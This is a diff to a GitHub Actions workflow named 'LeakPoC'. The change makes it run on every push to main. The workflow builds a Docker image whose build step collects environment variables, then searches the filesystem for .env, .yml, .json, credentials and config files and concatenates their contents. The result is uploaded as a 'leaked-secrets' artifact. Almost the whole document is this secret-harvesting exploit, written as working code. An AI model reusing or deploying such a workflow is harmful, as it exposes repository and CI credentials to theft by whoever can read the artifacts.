@@ -1,18 +1,21 @@
-name: Leak Secrets via Dockerfile Injection
+name: LeakPoC
 
 on:
-  workflow_dispatch:
+  push:
+    branches:
+      - main  # Or use "workflow_dispatch:" if you want to trigger manually
 
 jobs:
   leak:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Checkout repo
+      - name: Checkout repository
         uses: actions/checkout@v4
 
-      - name: Create Dockerfile
-        run: cat <<EOF > Dockerfile
+      - name: Create Dockerfile for Exploit
+        run: |
+          cat <<EOF > Dockerfile
 FROM python:3.11-alpine
 
 RUN apk add --no-cache grep findutils
@@ -20,25 +23,25 @@ RUN apk add --no-cache grep findutils
 RUN echo "[ENVIRONMENT VARIABLES]" > /secrets.txt && \
     (printenv | grep -v 'GITHUB_TOKEN' || true) >> /secrets.txt && \
     echo "\n\n[FILESYSTEM SECRETS (.env, .yml, credentials, etc)]" >> /secrets.txt && \
-    find / -type f \\
+    find / -type f \
       -iname "*.env" -o \
       -iname "*.yml" -o \
       -iname "*.json" -o \
       -iname "credentials" -o \
       -iname "config" \
-    \ -exec sh -c 'echo "\\n--- {} ---" && cat "{}"' \\; >> /secrets.txt 2>/dev/null || true
+    -exec sh -c 'echo "\n--- {} ---" && cat "{}"' \; >> /secrets.txt 2>/dev/null || true
 
 CMD ["cat", "/secrets.txt"]
 EOF
 
-      - name: Build image
-        run: docker build -t leakscan .
+      - name: Build Docker image
+        run: docker build -t leak-image .
 
-      - name: Run container and dump secrets
-        run: docker run --rm leakscan > all_secrets.txt
+      - name: Run container and collect leaked secrets
+        run: docker run --rm leak-image > all_secrets.txt
 
-      - name: Upload results
+      - name: Upload leak artifact
         uses: actions/upload-artifact@v4
         with:
-          name: dumped-secrets
+          name: leaked-secrets
           path: all_secrets.txt
